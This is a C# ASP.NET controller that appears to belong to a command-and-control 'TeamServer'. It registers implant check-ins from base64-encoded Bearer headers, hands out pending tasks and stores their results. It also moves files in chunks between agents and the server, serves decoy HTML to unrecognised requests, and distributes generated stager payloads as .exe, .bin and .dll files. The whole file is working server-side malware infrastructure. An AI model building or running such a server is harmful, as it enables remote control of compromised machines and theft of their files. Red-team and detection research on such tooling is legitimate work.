using ApiModels.Response;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Models.File;
using TeamServer.Services;

namespace TeamServer.Models
{
    [Controller]
    public class HttpListenerController : ControllerBase
    {
        private IAgentService _agentService;
        private IFileService _fileService;
        private IListenerService _listenerService;
        private IBinMakerService _binMakerService;

        public HttpListenerController(IAgentService agentService, IFileService fileService, IListenerService listenerService, IBinMakerService binMakerService, ILoggerFactory loggerFactory)
        {
            this._agentService=agentService;
            this._fileService = fileService;
            this._listenerService = listenerService;
            this._binMakerService = binMakerService;
        }


        
        public async Task<IActionResult> HandleImplant()
        {
            
            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return Content("<html>Hello</html>"); ;

            var agent = this._agentService.GetAgent(metadata.Id);
            if (agent == null)
            {
                agent = new Agent(metadata);
                this._agentService.AddAgent(agent);
            }

            agent.CheckIn();

            //string calledUri = this.Request.GetListenerUri();

            //System.IO.File.AppendAllText("log.log", calledUri + Environment.NewLine);

            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener != null)
            {
                //System.IO.File.AppendAllText("log.log", $"Found listener {listener.Id} with {listener.Uri}" + Environment.NewLine);
                agent.ListenerId = listener.Id;
            }

            if (HttpContext.Request.Method == "POST")
            {
                string json;
                using (var sr = new StreamReader(HttpContext.Request.Body))
                    json = await sr.ReadToEndAsync();

                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);

                agent.AddTaskResults(results);

                Logger.Log($"Saving resulst of {agent.Metadata.Id}");
                _fileService.SaveResults(agent, results);
            }


            var tasks = agent.GetPendingTaks();

            return Ok(tasks);
        }



        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
        {
            //Auhorization: Bearer <base64>
            if (!headers.TryGetValue("Authorization", out var encodedMetaDataHeader))
                return null;

            var encodedMetaData = encodedMetaDataHeader.ToString();

            if (!encodedMetaData.StartsWith("Bearer "))
                return null;

            encodedMetaData = encodedMetaData.Substring(7, encodedMetaData.Length - 7);

            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetaData));
            return JsonConvert.DeserializeObject<AgentMetadata>(json);
        }

        #region Download
        public IActionResult SetupDownload(string id)
        {
            var desc = _fileService.GetFile(id);
            if (desc == null)
                return NotFound();

            return Ok(new FileDescriptorResponse()
            {
                Id = desc.Id,
                Name = desc.Name,
                Length = desc.Length,
                ChunkCount = desc.ChunkCount,
                ChunkSize = desc.ChunkSize,
            });
        }

        public IActionResult DownloadChunk(string id, int index)
        {
            var desc = _fileService.GetFile(id);
            if (index < 0 || index >= desc.ChunkCount)
                return NotFound();

            var chunck = desc.Chunks[index];
            chunck.IsDownloaded = true;

            _fileService.CleanDownloaded();

            return Ok(new FileChunckResponse()
            {
                Data = chunck.Data,
                FileId = chunck.FileId,
                Index = chunck.Index,
            });
        }
        #endregion

        #region Upload
        public IActionResult SetupUpload([FromBody] FileDescriptor desc)
        {
            if (string.IsNullOrEmpty(desc.Id))
                return NotFound();

            _fileService.AddFile(desc);
            return Ok();
        }

        public IActionResult UploadChunk([FromBody] FileChunk chunk)
        {
            var desc = _fileService.GetFile(chunk.FileId);
            if (desc == null)
                return NotFound();

            var metadata = ExtractMetadata(HttpContext.Request.Headers);
            if (metadata == null)
                return NotFound();

            desc.Chunks.Add(chunk);

            return Ok();
        }
        #endregion

        public IActionResult ModuleInfo([FromBody] AgentTaskResult res)
        {
            //System.IO.File.AppendAllText("log.log", $"ModuleInfo called.{Environment.NewLine}");
            foreach (var agent in this._agentService.GetAgents())
            {
                var existing = agent.GetTaskResult(res.Id);
                if (existing != null)
                {
                    //System.IO.File.AppendAllText("log.log", $"Found at {existing.Id}{Environment.NewLine}");
                    existing.Status = res.Status;
                    existing.Info = res.Info;
                    existing.Result = res.Result;
                    
                    _fileService.SaveResults(agent, new List<AgentTaskResult> { existing });

                    break;
                }
            }

            return Ok();
        }


        public IActionResult DownloadStagerExe()
        {
            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener == null)
                return NotFound("No corresponding Listener");

            var path = this._fileService.GetListenerPath(listener.Name);
            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentExeFileName);
            if (!System.IO.File.Exists(fileName))
                return NotFound();

            byte[] fileBytes = null;
            using (FileStream fs = System.IO.File.OpenRead(fileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }


            return File(fileBytes, "application/octet-stream", "stager.exe");
        }

        public IActionResult DownloadStagerBin()
        {
            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener == null)
                return NotFound("No corresponding Listener");

            var path = this._fileService.GetListenerPath(listener.Name);
            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentBinFileName);
            if (!System.IO.File.Exists(fileName))
                return NotFound();

            byte[] fileBytes = null;
            using (FileStream fs = System.IO.File.OpenRead(fileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            return File(fileBytes, "application/octet-stream", "stager.bin");
        }

        public IActionResult DownloadStagerDll()
        {
            var listener = this._listenerService.GetListeners().FirstOrDefault(l => l.Uri == this.Request.GetListenerUri());
            if (listener == null)
                return NotFound("No corresponding Listener");

            var path = this._fileService.GetListenerPath(listener.Name);
            var fileName = Path.Combine(path, this._binMakerService.GeneratedAgentDllFileName);
            if (!System.IO.File.Exists(fileName))
                return NotFound();

            byte[] fileBytes = null;
            using (FileStream fs = System.IO.File.OpenRead(fileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            return File(fileBytes, "application/octet-stream", "stager.dll");
        }
    }
}
